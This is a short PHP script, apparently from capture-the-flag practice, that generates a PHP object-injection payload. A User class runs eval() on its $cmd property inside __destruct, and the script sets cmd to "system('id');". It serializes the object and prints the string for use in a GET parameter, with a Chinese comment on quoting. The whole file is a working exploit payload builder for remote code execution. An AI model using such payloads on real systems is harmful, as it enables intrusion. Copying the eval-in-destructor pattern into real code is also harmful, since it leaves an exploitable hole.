<?php
class User {
    var $cmd = "echo 'dazhuang666!!';" ;
    public function __destruct()
    {
        eval ($this->cmd);
    }
}
$b=new User();
$b->cmd="system('id');";
$c=serialize($b);
print($c);//""也不能加在get传参的时候
?>